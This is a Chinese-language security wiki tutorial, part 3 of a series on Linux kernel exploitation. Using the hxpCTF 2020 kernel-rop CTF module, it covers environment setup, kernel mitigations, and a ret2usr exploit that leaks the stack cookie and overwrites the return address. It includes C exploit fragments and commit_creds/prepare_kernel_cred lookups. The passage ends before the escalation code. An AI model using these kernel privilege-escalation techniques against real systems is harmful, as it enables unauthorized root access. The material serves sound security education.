<!DOCTYPE html>
<html lang="zh-CN">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>Linux内核利用 part 3 - 安全维基</title><meta name="Description" content="分享安全技术"><meta property="og:title" content="Linux内核利用 part 3" />
<meta property="og:description" content="前言 在本系列中，我将介绍过去几周学习的Linux内核利用的一些基本内容：从基本环境配置到流行的Linux内核保护措施，以及相应的利用技术。 当" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-02-05T15:36:08+08:00" />
<meta property="article:modified_time" content="2023-02-05T15:36:08+08:00" /><meta property="og:site_name" content="湖南大学安全Wiki" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="Linux内核利用 part 3"/>
<meta name="twitter:description" content="前言 在本系列中，我将介绍过去几周学习的Linux内核利用的一些基本内容：从基本环境配置到流行的Linux内核保护措施，以及相应的利用技术。 当"/>
<meta name="application-name" content="湖南大学安全Wiki">
<meta name="apple-mobile-web-app-title" content="湖南大学安全Wiki"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="../../../favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="../../../favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="../../../favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="../../../apple-touch-icon.png"><link rel="mask-icon" href="../../../safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="../../../site.webmanifest"><link rel="canonical" href="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC/" /><link rel="prev" href="../../../posts/7-%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/%E5%AE%89%E5%85%A8%E4%B9%A6%E7%B1%8D/" /><link rel="next" href="../../../posts/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-2-%E5%89%AF%E6%9C%AC/" /><link rel="stylesheet" href="../../../css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "Linux内核利用 part 3",
        "inLanguage": "zh-CN",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "\/posts\/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8\/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC\/"
        },"genre": "posts","keywords": "内核利用","wordcount":  6110 ,
        "url": "\/posts\/2-linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8\/linux%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8-part-3-%E5%89%AF%E6%9C%AC\/","datePublished": "2023-02-05T15:36:08+08:00","dateModified": "2023-02-05T15:36:08+08:00","publisher": {
            "@type": "Organization",
            "name": ""},"author": {
                "@type": "Person",
                "name": "admin"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="../../../" title="安全维基">湖南大学安全Wiki</a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="../../../categories/"> 所有分类 </a><a class="menu-item" href="../../../posts/"> 文章 </a><a class="menu-item" href="../../../tags/"> 标签 </a><a class="menu-item" href="../../../about/"> 关于 </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="../../../" title="安全维基">湖南大学安全Wiki</a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="../../../categories/" title="">所有分类</a><a class="menu-item" href="../../../posts/" title="">文章</a><a class="menu-item" href="../../../tags/" title="">标签</a><a class="menu-item" href="../../../about/" title="">关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
            </a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">目录</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux内核利用 part 3</h1><div class="post-meta">
            <div class="post-meta-line"><span class="post-author"><a href="../../../" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>admin</a></span>&nbsp;<span class="post-category">收录于 <a href="../../../categories/%E5%86%85%E6%A0%B8%E5%88%A9%E7%94%A8/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>内核利用</a></span></div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-02-05">2023-02-05</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;约 6110 字&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;预计阅读 13 分钟&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>目录</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
      </ul>
    </li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><h4 id="前言">前言</h4>
<p>在本系列中，我将介绍过去几周学习的Linux内核利用的一些基本内容：从基本环境配置到流行的Linux内核保护措施，以及相应的利用技术。
当我两年前刚开始学习CTF和pwn时，每次我听到别人提及“内核利用”，我感觉它是个很难又很神奇的东西。我尝试过几次，但由于当时对内核和操作系统缺乏充分了解，一直不知道怎么入门。在学习了更多有关计算机科学，特别是操作系统的知识之后，几个星期前，我再次尝试入门内核pwn。我知道对于pwn选手来说，过了这么久才开始学这个主题真的是很晚了，但就像那句话说的——晚学总比不学好。我后来发现这个主题并不像我原先一直认为的那么难（但它当然也不简单，我只学了一些基础知识），它只是需要比普通用户空间利用更多的初始深入知识和设置。因此，它要求pwn选手在开始内核利用之前要非常熟悉用户级利用。
我使用的是<code>hxpCTF 2020</code>中一个名为<code>kernel-rop</code>的题目提供的环境进行练习。不过我只是使用了该环境，这篇文章并不是题目解析。我选择这个环境的原因是：</p>
<ol>
<li>环境配置相当典型并且易于根据实践需要进行修改。</li>
<li>内核模块中的漏洞非常基础、简单。</li>
<li>为最新内核版本（截止我写这篇文章时）。
这个系列文章是我可以在将来回顾的模板，如果它也能帮到刚入门Linux内核利用的人，我将非常高兴。
那就让我们开始本系列的第一篇文章吧！我在其中演示了设置Linux内核pwn环境的最基本方法和最基本的利用技术。</li>
</ol>
<h4 id="配置环境">配置环境</h4>
<h5 id="初探">初探</h5>
<p>在Linux内核pwn问题中，我们要在引导时将有漏洞的自定义内核模块安装到内核中并利用它。在大多数情况下，该模块将与一些使用<code>qemu</code>作为Linux系统模拟器的文件一起提供。然而，在一些罕见情况下，我们也可能得到<code>VMWare</code>或<code>VirtualBox</code>虚拟机映像，或者没有任何模拟环境。但以我的经验来说，这非常少见，所以我只介绍由<code>qemu</code>模拟的常见情况。
在本次的<code>kernel-rop</code>问题中，我们得到了很多文件，但只有这些文件对<code>qemu</code>配置有用：</p>
<ul>
<li><code>vmlinuz</code>：压缩的Linux内核，有时也被称为<code>bzImage</code>。我们可以将它解压缩到称为<code>vmlinux</code>的实际内核ELF文件中。</li>
<li><code>initramfs.cpio.gz</code>：用<code>cpio</code>和<code>gzip</code>压缩的Linux文件系统。<code>/bin</code> <code>/etc</code>等目录存储在这个文件中，易受攻击的内核模块也可能在该文件系统中。在其他问题中，该文件可能采用其他压缩方案。</li>
<li><code>run.sh</code>：包含<code>qemu</code>run命令的shell脚本。<code>qemu</code>和Linux引导配置可以在此处更改。
让我们更深入地研究这些文件，逐一了解我们应该如何处理它们。</li>
</ul>
<h5 id="内核">内核</h5>
<p>Linux内核通常以<code>vmlinuz</code>或<code>bzImage</code>的名称给出，它是称为<code>vmlinux</code>的内核映像的压缩版本。可以使用<code>gzip</code>、<code>bzip2</code>、<code>lzma</code>等不同的压缩方案。我在这里使用<strong>extract-image.sh</strong>脚本来提取内核ELF文件：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ./extract-image.sh ./vmlinuz &gt; vmlinux
</code></pre></div><p>提取内核映像是为了在其中找到ROP配件。如果你熟悉用户级pwn，那么你就知道什么是<code>ROP</code>，它在内核中没有什么不同（我们将在后面看到）。我个人更喜欢使用<code>ROPgadget</code>来做这项工作：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ ROPgadget --binary ./vmlinux &gt; gadgets.txt
</code></pre></div><p>与简单的用户级程序不同，内核映像<strong>很大</strong>。因此，你将等很长时间，<code>ROPgadget</code>才能找到所有配件。所以在开始时就立即进行查找比较好。同时应该将输出保存到一个文件中以免多次运行<code>ROPgadget</code>来查找不同的配件。</p>
<h5 id="文件系统">文件系统</h5>
<p>同样，这是一个压缩文件，我使用脚本<strong>decompress.sh</strong>进行解压：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">mkdir initramfs
<span class="nb">cd</span> initramfs
cp ../initramfs.cpio.gz .
gunzip ./initramfs.cpio.gz
cpio -idm &lt; ./initramfs.cpio
rm initramfs.cpio
</code></pre></div><p>运行脚本后得到目录<code>initramfs</code>，它看起来像Linux机器上文件系统的根目录。我们看到易受攻击的内核模块<code>hackme.ko</code>也包含在根目录中。我们将把它复制到其他地方，稍后进行分析。
解压这个文件不仅可以获得易受攻击的模块，还可以根据我们的需要修改文件系统中的某些内容。
首先，我们可以查看<code>/etc</code>目录，因为大多数引导后运行的初始化脚本都存储在这里。我们在其中一个文件（通常是<code>rcS</code>或<code>inittab</code>）中查找以下行，然后修改它：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">setuidgid <span class="m">1000</span> /bin/sh
<span class="c1"># Modify it into the following</span>
setuidgid <span class="m">0</span> /bin/sh
</code></pre></div><p>这一行代码的目的是在引导后生成一个UID为<code>1000</code>的非根shell。将UID修改为<code>0</code>之后，我们将在启动时得到一个根shell。你也许想问：我们为什么要这样做？实际上，这看起来相当矛盾。因为我们的目标是利用内核模块来获得根权限，而不是修改文件系统（当然，我们不能修改题目的远程服务器上的文件系统）。这里的根本原因只是为了简化利用过程。在使用利用代码时，有些文件包含对我们有用的信息，但它们需要root权限来读取。例如：</p>
<ul>
<li><code>/proc/kallsyms</code>列出了加载到内核中的所有符号的地址</li>
<li><code>/sys/module/core/sections/.text</code>显示了内核的<code>.text</code>部分的地址，这也是它的基址（本题中没有<code>/sys</code>目录，但可以从<code>/proc/kallsyms</code>中检索基址）。</li>
</ul>
<blockquote>
<p>运行利用代码时要记得改回<code>1000</code>，以免利用时误报（你以为得到了根shell，其实并没有)。</p>
</blockquote>
<p>其次，解压文件系统，稍后将利用程序放进去。修改后，使用<strong>compress.sh</strong>脚本将其压缩回指定格式：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">gcc -o exploit -static <span class="nv">$1</span>
mv ./exploit ./initramfs
<span class="nb">cd</span> initramfs
find . -print0 <span class="se">\
</span><span class="se"></span><span class="p">|</span> cpio --null -ov --format<span class="o">=</span>newc <span class="se">\
</span><span class="se"></span><span class="p">|</span> gzip -9 &gt; initramfs.cpio.gz
mv ./initramfs.cpio.gz ../
</code></pre></div><p>前两行编译利用代码并将其放入文件系统。</p>
<h5 id="qemu运行脚本">qemu运行脚本</h5>
<p>最初，给定的<strong>run.sh</strong>看起来像这样：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span class="se">\
</span><span class="se"></span>    -m 128M <span class="se">\
</span><span class="se"></span>    -cpu kvm64,+smep,+smap <span class="se">\
</span><span class="se"></span>    -kernel vmlinuz <span class="se">\
</span><span class="se"></span>    -initrd initramfs.cpio.gz <span class="se">\
</span><span class="se"></span>    -hdb flag.txt <span class="se">\
</span><span class="se"></span>    -snapshot <span class="se">\
</span><span class="se"></span>    -nographic <span class="se">\
</span><span class="se"></span>    -monitor /dev/null <span class="se">\
</span><span class="se"></span>    -no-reboot <span class="se">\
</span><span class="se"></span>    -append <span class="s2">&#34;console=ttyS0 kaslr kpti=1 quiet panic=1&#34;</span>
</code></pre></div><p>部分标志含义：</p>
<ul>
<li><code>-m</code>指定内存大小。如果无法启动模拟器，可以试着增加内存大小。</li>
<li><code>-cpu</code>指定CPU模型。我们可以在此处给SMEP和SMAP缓解功能添加<code>+smep</code>和<code>+smap</code>（稍后详细介绍）。</li>
<li><code>-kernel</code>指定压缩内核映像。</li>
<li><code>-initrd</code>指定压缩文件系统。</li>
<li><code>-append</code>指定额外启动选项。可以在此处启用/禁用缓解功能。</li>
<li>可以在QEMU文档中找到其他选项。</li>
</ul>
<blockquote>
<p>本题使用<code>-hdb</code>将<code>flag.txt</code>放到<code>/dev/sda</code>中，而不是将其作为一个普通文件留在系统中。这可能是为了防止pwn选手使用一些CTF小伎俩作弊，也可能只是为了让题目环境更易部署。</p>
</blockquote>
<p>首先，添加<code>-s</code>选项（这个选项允许我们从主机上远程调试模拟器内核）。之后正常启动模拟器，然后在主机上运行：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">$ gdb vmlinux
<span class="o">(</span>gdb<span class="o">)</span> target remote localhost:1234
</code></pre></div><p>然后就可以正常调试系统内核，就像在普通用户进程中使用<code>gdb</code>一样。</p>
<blockquote>
<p>在远程调试内核时，有时<code>peda</code>、<code>pwndbg</code>和<code>GEF</code>表现地很奇怪，你可以用<code>gdb ——nx vmlinux</code>命令禁用它们。</p>
</blockquote>
<p>其次，我们可以根据实践需求修改保护功能。当然，我们可能不会真的在打CTF时这样做。但我这是在不同场景中练习不同的利用技术，所以修改它们是完全没问题的。</p>
<h4 id="linux内核保护功能">Linux内核保护功能</h4>
<p>就像用户程序使用ASLR、栈金丝雀、PIE等保护功能，内核也有一组自己的保护功能。下面是一些我在学习内核pwn时会考虑的常见并值得注意的Linux内核保护功能：</p>
<ul>
<li>内核栈cookie（或金丝雀）：它与用户级的栈金丝雀完全相同。它在编译时在内核中启用，不能禁用。</li>
<li>内核地址空间布局随机化（Kernel address space layout randomization - KASLR）：和用户级的<code>ASLR</code>一样，它在每次系统引导时随机加载内核基址。可以通过在<code>-append</code>选项下添加<code>kaslr</code>或<code>nokaslr</code>来启用/禁用它。</li>
<li>管理模式执行保护（Supervisor mode execution protection - SMEP）：当进程处于内核模式时，此功能将页表中所有用户页标记为不可执行。在内核中，这是通过设置控制寄存器<code>CR4</code>的<code>第20位</code>来实现的。引导时，可以通过向<code>-cpu</code>添加<code>+smep</code>启用它，向<code>-append</code>添加<code>nosmep</code>禁用它。</li>
<li>管理模式访问防范（Supervisor Mode Access Prevention - SMAP)：SMAP作为SMEP的补充，当进程处于内核模式时，标记页表中所有用户页为不可访问意味着它们同时也读写。在内核中，SMAP通过设置控制寄存器<code>CR4</code>的<code>第21位</code>实现。引导时，可以通过向<code>-cpu</code>添加<code>+smap</code>启用它，向<code>-append</code>添加<code>nosmap</code>禁用它。</li>
<li>内核页表隔离（Kernel page-table isolation - KPTI）：当此功能启用时，内核完全分离用户空间和内核空间页表。包括内核空间地址和用户空间地址的一组页表只在系统运行在内核模式时使用。用户模式下使用的页表包含用户空间的副本和最小内核空间地址集。它可以通过在<code>-append</code>选项下添加<code>kpti=1</code>或<code>nopti</code>来启用/禁用。
我从启用最简单的保护功能（栈cookies）开始学习，逐渐添加更多功能，以便学习在不同情况下使用的不同技术。
先让我们分析一下易受攻击的<strong>hackme.ko</strong>模块。</li>
</ul>
<h4 id="分析内核模块">分析内核模块</h4>
<p>这个模块非常简单。首先，在<code>hackme_init()</code>中用以下操作注册一个名为<code>hackme</code>的设备：<code>hackme_read</code>, <code>hackme_write</code>, <code>hackme_open</code>和<code>hackme_release</code>。这意味着我们可以通过打开<code>/dev/hackme</code>与这个模块通信，并对其执行读写操作。
在设备上执行读写操作会调用内核中的<code>hackme_read()</code>或<code>hackme_write()</code>，它们的代码如下（使用IDA pro并省略了一些不相关内容）：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
<span class="p">{</span>   
    <span class="c1">//...
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="c1">//...
</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
        <span class="n">BUG</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">v5</span><span class="p">)</span> <span class="p">)</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">14LL</span><span class="p">;</span>
    <span class="n">_memcpy</span><span class="p">(</span><span class="n">tmp</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">);</span>
    <span class="c1">//...
</span><span class="c1"></span><span class="p">}</span>

<span class="n">ssize_t</span> <span class="kr">__fastcall</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>
<span class="p">{</span>   
    <span class="c1">//...
</span><span class="c1"></span>    <span class="kt">int</span> <span class="n">tmp</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
    <span class="c1">//...
</span><span class="c1"></span>    <span class="n">_memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">tmp</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">_size</span> <span class="o">&gt;</span> <span class="mh">0x1000</span> <span class="p">)</span>
    <span class="p">{</span>
        <span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4096LL</span><span class="p">,</span> <span class="n">_size</span><span class="p">);</span>
        <span class="n">BUG</span><span class="p">();</span>
    <span class="p">}</span>
    <span class="n">_check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
    <span class="n">v6</span> <span class="o">=</span> <span class="n">copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">hackme_buf</span><span class="p">,</span> <span class="n">_size</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">;</span>
    <span class="c1">//...
</span><span class="c1"></span><span class="p">}</span>
</code></pre></div><p>这两个函数的漏洞非常明显：它们都读/写一个长度为0x80字节的栈缓冲区，但只有大小大于0x1000时才警告缓冲区溢出。我们可以利用该漏洞自由地读/写内核栈。
现在，让我们看看怎样使用上面的原语得到根权限。首先从尽可能简单的保护功能开始：栈cookie。</p>
<h4 id="最简单的利用ret2usr">最简单的利用——ret2usr</h4>
<h5 id="概念">概念</h5>
<p>回想一下，当我们刚学用户级pwn时，大多数人应该见过简单的堆栈缓冲区溢出问题，其中<code>ASLR</code>是禁用的，<code>NX</code>位没有设置。这是一种称为<code>ret2shellcode</code>的技术。我们将shellcode放在栈的某个地方，调试找到它的地址，用它覆盖当前函数的返回地址。
返回到用户（即<code>ret2usr</code>）想法与其类似。因为我们可以完全控制用户空间中的内容，比起将shellcode放在栈上，我们可以直接把希望程序流跳转到的代码放在用户空间中。之后，我们只需用该地址覆盖内核中正在调用的函数的返回地址。因为易受攻击的函数是一个内核函数，所以即使我们的代码在用户空间中，也要在内核模式下执行。通过这种方式，我们已经实现了任意代码执行。
为了让该技术生效，我们将删除qemu运行脚本中的大部分保护功能（如<code>+smep</code>, <code>+smap</code>, <code>kpti=1</code>, <code>kaslr</code>），并添加<code>nopti</code>, <code>nokaslr</code>。
由于这是本系列的第一个技术，我将一步一步地解释利用过程。</p>
<h5 id="打开设备">打开设备</h5>
<p>在与模块交互之前，我们必须先打开它。打开设备和打开普通文件一样简单：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">global_fd</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">open_dev</span><span class="p">(){</span>
    <span class="n">global_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/dev/hackme&#34;</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">global_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
		<span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Failed to open device&#34;</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Opened device&#34;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>现在我们就可以读写<code>global_fd</code>了。</p>
<h5 id="栈cookie泄漏">栈cookie泄漏</h5>
<p>因为我们可以读任意栈，栈cookie泄漏很简单。栈上的<code>tmp</code>缓冲区0x80字节长，栈cookie紧随其后。因此，如果我们将数据读到一个无符号长数组（每个元素8字节），cookie的偏移量将是16：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cookie</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">leak</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">20</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
    <span class="n">ssize_t</span> <span class="n">r</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>
    <span class="n">cookie</span> <span class="o">=</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Leaked %zd bytes</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">r</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Cookie: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">cookie</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><h5 id="覆盖返回地址">覆盖返回地址</h5>
<p>与栈cookie泄漏相同，我们将创建一个无符号长数组，然后在索引值为16处用泄漏的cookie覆盖原cookie。需要注意的是，与用户程序不同，这个内核函数从栈中弹出<code>rbx</code>, <code>r12</code>, <code>rbp</code>3个寄存器，而不仅仅是<code>rbp</code>（可以在反汇编函数时清楚地看到）。因此，我们必须在cookie后面放3个虚拟值。其后放希望程序返回的返回地址，它是我们在用户空间上精心设计以得到根权限的函数。我称之为<code>escalate_privs</code>：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">void</span> <span class="nf">overflow</span><span class="p">(</span><span class="kt">void</span><span class="p">){</span>
    <span class="kt">unsigned</span> <span class="n">n</span> <span class="o">=</span> <span class="mi">50</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="n">n</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="n">off</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">cookie</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp
</span><span class="c1"></span>    <span class="n">payload</span><span class="p">[</span><span class="n">off</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">escalate_privs</span><span class="p">;</span> <span class="c1">// ret
</span><span class="c1"></span>
    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[*] Prepared payload&#34;</span><span class="p">);</span>
    <span class="n">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">global_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&#34;[!] Should never be reached&#34;</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div><p>最后一个问题是我们要在函数中写什么来得到根权限。</p>
<h5 id="获得根权限">获得根权限</h5>
<p>再次提醒一下，内核利用的目标不是通过<code>system(&quot;/bin/sh&quot;)</code>或<code>execve(&quot;/bin/sh&quot;， NULL, NULL)</code>弹出shell，而是在系统中获得根权限，然后弹出根shell。通常，最常见的方法是使用两个函数<code>commit_creds()</code>和<code>prepare_kernel_cred()</code>，这两个函数就在内核空间代码中。我们需要做的是像这样调用这两个函数：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
</code></pre></div><p>由于<code>KASLR</code>被禁用，这些函数所在的地址在每次引导中都是不变的。因此，我们可以通过使用这些shell命令读取<code>/proc/kallsyms</code>文件轻松获得地址：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">cat /proc/kallsyms <span class="p">|</span> grep commit_creds
-&gt; ffffffff814c6410 T commit_creds
cat /proc/kallsyms <span class="p">|</span> grep prepare_kernel_cred
-&gt; ffffffff814c67f0 T prepare_kernel_cred
</code></pre></div><p>得到根权限的代码可以这样写（你可以用很多不同的方式来写。它只是简单地连续调用两个函数，使用一个函数的返回值作为另一个函数的参数。我在一篇文章中看到并复制了它）：</p>
